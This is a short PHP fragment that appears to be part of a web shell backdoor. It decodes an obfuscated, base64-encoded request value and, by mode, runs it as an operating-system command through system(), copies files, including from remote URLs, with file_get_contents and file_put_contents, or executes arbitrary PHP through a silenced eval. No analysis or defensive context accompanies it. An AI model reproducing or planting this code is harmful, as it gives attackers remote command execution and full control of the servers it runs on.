$r[1] = c(base64_decode($r[1]), $r[0]);
echo '<'.$r[0].'>';
switch($r[2]){
	case 0:
		system($r[1]." 2>&1");
		break;
	case 1:
		$c = explode(' ', $r[1]);
		echo file_put_contents($c[1], file_get_contents($c[0]))."\n";
		break;
	case 2:
		@eval($r[1]);
		break;
}
echo '</'.$r[0].'>';
